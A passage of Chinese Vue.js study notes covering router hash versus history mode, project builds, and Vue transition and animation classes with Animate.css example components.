④ <u>第三方app校验严格，可能会导致地址失效</u>。

(2) history模式

① 路径中没有#，<u>美观</u>。

② <u>兼容性稍微差一些</u>。

③ 项目上线后，<u>刷新地址的话会出现404问题</u>。需要后端人员配合可以解决该问题。

3.、默认是hash模式，如何开启history模式

(1) router/index.js文件中，<u>在创建路由器对象router时添加一个mode配置项：</u>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433665228-5e611322-a84d-4242-b8df-caff875fcea8.png)

4. 项目打包

(1) 将Xxx.vue全部编译打包为HTML CSS JS文件。

(2) npm run build

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433665553-05ead766-4e4c-4f8e-a90e-746a8017f6e8.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433665822-ebe9ba47-6ed3-43a9-90d6-de95ab419e89.png)



**《07、vue动画》**

## 1、动画实现
（1）、操作css的transition或animation

（2）、在插入、更新或移除DOM元素时，在合适的时候给元素添加样式类名

（3）、过渡的相关类名：

<font style="color:#DF2A3F;">xxx-enter-active: 进入的时候激活样式</font>

<font style="color:#DF2A3F;">xxx-leave-active: 离开的时候激活样式</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433666122-56a2e522-d208-49b7-b2f2-89d2436ae8cd.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433666345-4cd5365f-e472-4907-9960-96d0067f968d.png)

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <button @click="isShow = !isShow">显示/隐藏</button></font>

<font style="color:#595959;">    <!-- </font>

<font style="color:#595959;">        1、name="hello" 定义类名的时候使用，默认是v-</font>

<font style="color:#595959;">        2、appear 一开始就有动画</font>

<font style="color:#595959;">        3、transition最终是没有形成标签的，只是起到占位作用</font>

<font style="color:#595959;">   --></font>

<font style="color:#595959;">    <transition name="hello" appear></font>

<font style="color:#595959;">      <h1 v-show="isShow">你好啊！</h1></font>

<font style="color:#595959;">    </transition></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  name: "Test",</font>

<font style="color:#595959;">  data() {</font>

<font style="color:#595959;">    return {</font>

<font style="color:#595959;">      isShow: true,</font>

<font style="color:#595959;">    };</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style scoped></font>

<font style="color:#595959;">h1 {</font>

<font style="color:#595959;">  background-color: orange;</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">/* 默认是v-enter-active */</font>

<font style="color:#595959;">.hello-enter-active {</font>

<font style="color:#595959;">  animation: move 0.5s linear;</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">.hello-leave-active {</font>

<font style="color:#595959;">  animation: move 0.5s linear reverse;</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">@keyframes move {</font>

<font style="color:#595959;">  from {</font>

<font style="color:#595959;">    transform: translateX(-100%);</font>

<font style="color:#595959;">  }</font>



<font style="color:#595959;">  to {</font>

<font style="color:#595959;">    transform: translateX(0px);</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></style></font>

## <font style="color:#000000;">2、过渡实现：</font>
<font style="color:#000000;">（1）、准备好样式：</font>

<font style="color:#000000;">元素进入的样式</font>

<font style="color:#DF2A3F;">v-enter：进入的起点</font>

<font style="color:#DF2A3F;">v-enter-active进入过程中</font>

<font style="color:#DF2A3F;">v-enter-to：进去的终点</font>

<font style="color:#000000;">元素离开的样式</font>

<font style="color:#DF2A3F;">v-leave：离开的起点</font>

<font style="color:#DF2A3F;">v-leave-active：离开的过程中</font>

<font style="color:#DF2A3F;">v-leave-to：离开的终点</font>

<font style="color:#000000;">（2）：在目标元素外包裹，配置的name属性的属性值，替换上面样式名的v</font>

<font style="color:#000000;">（3）、</font><u><font style="color:#000000;">如果要让页面一开始就显示动画，需要添加appear</font></u>

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <button @click="isShow = !isShow">显示/隐藏</button></font>

<font style="color:#595959;">    <transition name="hello" appear></font>

<font style="color:#595959;">      <h1 v-show="!isShow">你好啊！</h1></font>

<font style="color:#595959;">    </transition></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  name: "Test2",</font>

<font style="color:#595959;">  data() {</font>

<font style="color:#595959;">    return {</font>

<font style="color:#595959;">      isShow: true,</font>

<font style="color:#595959;">    };</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style scoped></font>

<font style="color:#595959;">h1 {</font>

<font style="color:#595959;">  background-color: orange;</font>

<font style="color:#595959;">  /* 3、写法一，设置过渡 */</font>

<font style="color:#595959;">  transition: 0.5s linear;</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">/*1.1 hello-enter 进入的起点 */</font>

<font style="color:#595959;">.hello-enter {</font>

<font style="color:#595959;">  transform: translateX(-100%);</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">/*1.2 hello-enter-to进入的终点*/</font>

<font style="color:#595959;">.hello-enter-to {</font>

<font style="color:#595959;">  transform: translateX(0);</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">/*2.1 hello-leave离开的起点  */</font>

<font style="color:#595959;">.hello-leave {</font>

<font style="color:#595959;">  transform: translateX(0);</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">/*2.2 hello-leave-to离开的终点 */</font>

<font style="color:#595959;">.hello-leave-to {</font>

<font style="color:#595959;">  transform: translateX(-100%);</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">/* 3.2 写法二、设置进入离开的过程 */</font>

<font style="color:#595959;">/* .hello-enter-active,</font>

<font style="color:#595959;">.hello-leave-active {</font>

<font style="color:#595959;">  transition: 0.5s linear;</font>

<font style="color:#595959;">} */</font>

<font style="color:#595959;"></style></font>

（4）、备注：若多个元素需要过渡，则需要使用<font style="color:#DF2A3F;"><transition-group></font>，且每个元素要配合指定的key值

需求：样式互斥，交叉过渡

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <button @click="isShow = !isShow">显示/隐藏</button></font>

<font style="color:#595959;">    <transition-group name="hello" appear></font>

<font style="color:#595959;">      <h1 v-show="!isShow" key="1">你好啊！</h1></font>

<font style="color:#595959;">      <h1 v-show="isShow" key="2">bdqn</h1></font>

<font style="color:#595959;">    </transition-group></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>

<font style="color:#595959;">······</font>

## 3、第三方动画库 Animate.css
安装动画库

<font style="color:#595959;">npm install animate.css --save</font>

使用时，需要导入 

<font style="color:#595959;">import "animate.css";</font>

参考网址：

[https://animate.style/](https://animate.style/" \t "_blank)

具体使用demo

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <button @click="isShow = !isShow">显示/隐藏</button></font>

<font style="color:#595959;">    <!-- 第二步：name="animate__animated animate__bounce" 固定的，必须要写 --></font>

<font style="color:#595959;">    <!-- 第三步： enter-active-class='效果' leave-active-class='效果'--></font>

<font style="color:#595959;">    <transition-group appear </font>

<font style="color:#595959;">    name="animate__animated animate__bounce" </font>

<font style="color:#595959;">    enter-active-class="animate__backInDown"</font>

<font style="color:#595959;">      leave-active-class="animate__backOutUp"></font>

<font style="color:#595959;">      <h1 style="background-color: orange;" v-show="!isShow" key="1">你好啊！</h1></font>

<font style="color:#595959;">      <h1 style="background-color: aquamarine;" v-show="isShow" key="2">bdqn</h1></font>

<font style="color:#595959;">    </transition-group></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">// 第一步：引入动画库</font>

<font style="color:#595959;">import "animate.css";</font>



<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  name: "Test3",</font>

<font style="color:#595959;">  data() {</font>

<font style="color:#595959;">    return {</font>

<font style="color:#595959;">      isShow: true,</font>

<font style="color:#595959;">    };</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;"></script></font>
